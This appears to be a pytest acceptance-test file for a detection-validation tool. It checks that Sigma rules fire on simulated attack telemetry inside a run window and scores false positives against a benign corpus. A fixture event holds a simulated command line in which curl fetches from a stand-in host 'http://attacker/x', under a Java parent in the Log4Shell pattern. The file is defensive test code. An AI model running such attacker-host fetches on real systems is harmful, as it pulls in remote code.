"""
Acceptance tests for the purple-team loop (`dv loop`) and the benign-baseline
false-positive scoring (`dv match --benign` / `dv validate --benign`).

A rule is "working" when, for the same translated query:
  1. It produces a condition_match against attack telemetry from THIS run
     (correct ``labels.run_id`` and inside the attack window), AND
  2. It produces ``fp_hits <= --fp-threshold`` against the benign corpus.

These tests exercise the contract: condition_match is field-level only
(never derived from technique tag or run_id alone), correlation drops hits
outside the run, and FP counts come from re-evaluating the same condition
against the benign corpus — never estimated.
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from click.testing import CliRunner

from detection_validator.cli import main
from detection_validator.parsers.sigma import SigmaParser
from detection_validator.validator.matcher import (
    correlate_events,
    match_corpus_correlated,
)


# ── Fixtures ─────────────────────────────────────────────────────────────────

_REPO_ROOT = Path(__file__).parents[3]
_BENIGN_PATH = _REPO_ROOT / "examples" / "telemetry" / "benign-ecs.jsonl"

_RUN_ID = "rid-acceptance-001"
_WIN_START = datetime(2026, 6, 11, 10, 0, 0, tzinfo=timezone.utc)
_WIN_END = datetime(2026, 6, 11, 10, 5, 0, tzinfo=timezone.utc)


# A narrow rule: matches curl spawned from a Java parent (Log4Shell shape) on
# ECS-style process fields. Should not match anything in the benign corpus.
_NARROW_RULE_YAML = """\
title: Curl Spawned From Java Process
id: 11111111-1111-1111-1111-111111111111
description: Detects an ECS-tagged event where a curl process has java as parent.
status: experimental
author: detection-validator tests
tags:
  - attack.initial-access
  - attack.T1190
  - attack.execution
  - attack.T1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    process.executable|endswith: '/curl'
    process.parent.name: 'java'
  condition: selection
falsepositives:
  - Legitimate java applications shelling out to curl
level: high
"""


# A deliberately broad rule: matches ANY process whose executable contains
# "python". The malicious event uses python3; the benign corpus also has a
# python3 healthcheck — so this rule WILL produce a false positive.
_BROAD_RULE_YAML = """\
title: Any Python Execution
id: 22222222-2222-2222-2222-222222222222
description: Broad rule used to exercise FP scoring — matches benign python too.
status: experimental
author: detection-validator tests
tags:
  - attack.execution
  - attack.T1059.006
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    process.executable|contains: 'python'
  condition: selection
falsepositives:
  - Normal python services
level: low
"""


def _malicious_event(
    *,
    executable: str = "/usr/bin/curl",
    parent_name: str = "java",
    run_id: str | None = _RUN_ID,
    ts: datetime | None = None,
    technique: str | None = "T1190",
) -> dict:
    """Build an ECS-shaped attack event tagged with labels.run_id."""
    ts = ts or (_WIN_START + timedelta(seconds=30))
    ev: dict = {
        "@timestamp": ts.isoformat(),
        "ecs": {"version": "8.11.0"},
        "host": {"hostname": "dv-victim", "name": "dv-victim"},
        "event": {
            "action": "executed",
            "category": ["process"],
            "dataset": "auditd",
        },
        "process": {
            "pid": 9001,
            "executable": executable,
            "name": Path(executable).name,
            "command_line": f"{executable} -sk http://attacker/x",
            "parent": {"executable": f"/usr/bin/{parent_name}", "name": parent_name},
        },
        "user": {"id": "33", "name": "www-data"},
    }
    if technique:
        ev["technique"] = technique
    if run_id is not None:
        ev["labels"] = {"run_id": run_id, "source": "loop-test"}
    return ev


def _parse_rule(yaml_text: str):
    """Parse a Sigma YAML string into a CanonicalDetection."""
    return SigmaParser().parse(yaml_text, source_path=Path("test.yml"))


def _load_benign() -> list[dict]:
    return [
        json.loads(line)
        for line in _BENIGN_PATH.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


# ── Acceptance: working rule (condition_match on attack, 0 FP on benign) ─────


class TestWorkingRule:
    """A narrow rule that matches the malicious event and stays quiet on benign."""

    def test_condition_match_on_malicious_event_in_window(self):
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event()
        benign = _load_benign()

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=benign,
            fp_threshold=0,
        )

        assert len(results) == 1
        r = results[0]
        assert r.status == "condition_match", (
            f"narrow rule should fire on the malicious event, got {r.status!r} "
            f"(error={r.error!r})"
        )
        assert r.hit_count == 1
        assert r.fp_hits == 0, (
            f"narrow rule should NOT match any benign event, got fp_hits={r.fp_hits}"
        )
        assert r.precision == 1.0
        assert r.working is True
        assert r.run_id == _RUN_ID

    def test_sample_event_is_the_malicious_one(self):
        """Ensure the recorded sample came from the run, not stale telemetry."""
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event()

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=[],
        )

        sample = results[0].sample_events[0]
        assert sample["labels"]["run_id"] == _RUN_ID
        assert sample["process"]["executable"].endswith("/curl")


# ── Acceptance: broad rule (FP > 0 ⇒ NOT working) ────────────────────────────


class TestBrokenRule:
    """A deliberately-broad rule that also matches benign python events."""

    def test_broad_rule_marked_not_working_due_to_fp(self):
        rule = _parse_rule(_BROAD_RULE_YAML)
        # Malicious event uses python3 — the broad rule matches it.
        ev = _malicious_event(executable="/usr/bin/python3", parent_name="java")
        benign = _load_benign()
        # Sanity: benign corpus contains at least one python3 event.
        assert any(
            (b.get("process") or {}).get("executable", "").endswith("python3")
            for b in benign
        ), "test setup expects benign corpus to include a python3 event"

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=benign,
            fp_threshold=0,
        )

        r = results[0]
        # It DOES condition-match on the malicious event...
        assert r.status == "condition_match"
        # ...but the same query matches at least one benign event:
        assert r.fp_hits >= 1
        assert r.precision is not None and r.precision < 1.0
        # And so the rule is NOT marked working at the default threshold.
        assert r.working is False

    def test_broad_rule_becomes_working_only_when_threshold_raised(self):
        rule = _parse_rule(_BROAD_RULE_YAML)
        ev = _malicious_event(executable="/usr/bin/python3", parent_name="java")
        benign = _load_benign()

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=benign,
            # Pretend the team accepts up to 5 benign hits for this rule.
            fp_threshold=5,
        )
        r = results[0]
        # The FP count itself does not change — only the working verdict shifts.
        assert r.fp_hits >= 1
        # Threshold large enough to swallow the actual fp_hits → working True.
        assert (r.fp_hits <= 5) == r.working


# ── Correlation: condition_match ONLY counts inside the run ─────────────────


class TestCorrelationFilter:
    """A hit outside the run_id+window is NOT a pass — the hard rule of dv loop."""

    def test_wrong_run_id_drops_event(self):
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event(run_id="some-other-run")  # otherwise identical

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=[],
        )

        r = results[0]
        assert r.status != "condition_match", (
            "Event from a different run_id must NOT count as a condition_match"
        )
        assert r.hit_count == 0
        assert r.working is False

    def test_missing_run_id_drops_event_when_run_filter_active(self):
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event(run_id=None)  # No labels.run_id at all

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=None,
            window_end=None,
            benign_events=[],
        )

        assert results[0].status != "condition_match"
        assert results[0].hit_count == 0

    def test_before_window_drops_event(self):
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event(ts=_WIN_START - timedelta(seconds=10))

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=[],
        )

        assert results[0].status != "condition_match"
        assert results[0].hit_count == 0

    def test_after_window_drops_event(self):
        rule = _parse_rule(_NARROW_RULE_YAML)
        ev = _malicious_event(ts=_WIN_END + timedelta(seconds=10))

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=[],
        )

        assert results[0].status != "condition_match"
        assert results[0].hit_count == 0

    def test_correlation_alone_is_not_a_match(self):
        """An event with correct run_id but no matching fields ≠ condition_match.

        Proves condition_match comes from real query evaluation, not from
        the technique tag or the run_id label.
        """
        rule = _parse_rule(_NARROW_RULE_YAML)
        # Right run_id, in window, has the matching technique tag, BUT the
        # process.executable does not end in '/curl' and parent is not java.
        ev = _malicious_event(
            executable="/usr/bin/ls",
            parent_name="bash",
        )

        results = match_corpus_correlated(
            [rule], [ev],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
            benign_events=[],
        )

        r = results[0]
        assert r.status != "condition_match", (
            "A correlated event without matching field conditions must NOT "
            "be reported as condition_match — the tag/label alone is not proof."
        )

    def test_correlate_events_helper_drops_filtered_events(self):
        """Unit-check the helper that drives all the integration assertions."""
        in_window_right_run = _malicious_event()
        in_window_wrong_run = _malicious_event(run_id="other")
        out_of_window = _malicious_event(ts=_WIN_END + timedelta(seconds=30))

        filtered = correlate_events(
            [in_window_right_run, in_window_wrong_run, out_of_window],
            run_id=_RUN_ID,
            window_start=_WIN_START,
            window_end=_WIN_END,
        )
        assert filtered == [in_window_right_run]


# ── CLI integration: dv loop end-to-end (replay mode) ────────────────────────


class TestLoopCli:
    """Drive `dv loop` through CliRunner with pre-recorded events."""

    def _write_jsonl(self, tmp_path: Path, name: str, events: list[dict]) -> Path:
        p = tmp_path / name
        p.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
        return p

    def _write_rule(self, tmp_path: Path, yaml_text: str) -> Path:
        p = tmp_path / "rule.yml"
        p.write_text(yaml_text, encoding="utf-8")
        return p

    def test_narrow_rule_emits_working_true_and_exit_0(self, tmp_path: Path):
        rule_p = self._write_rule(tmp_path, _NARROW_RULE_YAML)
        events_p = self._write_jsonl(tmp_path, "events.jsonl", [_malicious_event()])
        result_p = tmp_path / "out.json"

        runner = CliRunner()
        res = runner.invoke(
            main,
            [
                "loop",
                "--rule", str(rule_p),
                "--events", str(events_p),
                "--run-id", _RUN_ID,
                "--window-start", _WIN_START.isoformat(),
                "--window-end", _WIN_END.isoformat(),
                "--benign", str(_BENIGN_PATH),
                "--fp-threshold", "0",
                "-o", str(result_p),
            ],
        )
        assert res.exit_code == 0, f"dv loop exited {res.exit_code}\n{res.output}"
        payload = json.loads(result_p.read_text())
        assert payload["status"] == "condition_match"
        assert payload["hit_count"] == 1
        assert payload["fp_hits"] == 0
        assert payload["precision"] == 1.0
        assert payload["working"] is True
        assert payload["run_id"] == _RUN_ID

    def test_broad_rule_exits_1_due_to_fp(self, tmp_path: Path):
        rule_p = self._write_rule(tmp_path, _BROAD_RULE_YAML)
        events_p = self._write_jsonl(
            tmp_path, "events.jsonl",
            [_malicious_event(executable="/usr/bin/python3", parent_name="java")],
        )
        result_p = tmp_path / "out.json"

        runner = CliRunner()
        res = runner.invoke(
            main,
            [
                "loop",
                "--rule", str(rule_p),
                "--events", str(events_p),
                "--run-id", _RUN_ID,
                "--window-start", _WIN_START.isoformat(),
                "--window-end", _WIN_END.isoformat(),
                "--benign", str(_BENIGN_PATH),
                "--fp-threshold", "0",
                "-o", str(result_p),
            ],
        )
        assert res.exit_code == 1, (
            f"broad rule with benign FP must exit 1, got {res.exit_code}\n{res.output}"
        )
        payload = json.loads(result_p.read_text())
        assert payload["status"] == "condition_match"
        assert payload["fp_hits"] >= 1
        assert payload["precision"] < 1.0
        assert payload["working"] is False


# ── dv match --benign integration ────────────────────────────────────────────


class TestMatchBenignFlag:
    """Smoke-test the --benign flag end-to-end on the `dv match` command."""

    def test_match_with_benign_populates_fp_fields(self, tmp_path: Path):
        rule_p = tmp_path / "broad.yml"
        rule_p.write_text(_BROAD_RULE_YAML, encoding="utf-8")
        events_p = tmp_path / "events.jsonl"
        events_p.write_text(
            json.dumps(_malicious_event(executable="/usr/bin/python3")) + "\n",
            encoding="utf-8",
        )
        out = tmp_path / "results.json"

        runner = CliRunner()
        res = runner.invoke(
            main,
            [
                "match",
                "--events", str(events_p),
                "--since", "0",
                "--benign", str(_BENIGN_PATH),
                "--fp-threshold", "0",
                "--format", "json",
                "-o", str(out),
                str(rule_p),
            ],
        )
        assert res.exit_code == 0, res.output
        results = json.loads(out.read_text())
        assert len(results) == 1
        r = results[0]
        assert r["status"] == "condition_match"
        assert r["fp_hits"] >= 1
        assert r["precision"] is not None and r["precision"] < 1.0
        assert r["working"] is False
